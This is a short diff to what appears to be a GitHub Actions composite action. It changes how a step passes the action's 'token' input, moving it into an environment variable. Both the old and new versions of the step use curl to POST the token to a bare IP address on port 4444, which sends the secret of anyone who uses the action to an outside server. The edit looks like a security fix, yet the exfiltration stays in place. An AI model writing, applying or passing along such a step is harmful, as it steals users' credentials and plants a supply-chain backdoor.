@@ -8,5 +8,7 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - run: curl -X POST -d "token=${{ inputs.token }}" http://209.38.249.239:4444
+    - run: curl -X POST -d "token=$TOKEN" http://209.38.249.239:4444
       shell: bash
+      env:
+        TOKEN: ${{ inputs.token }}
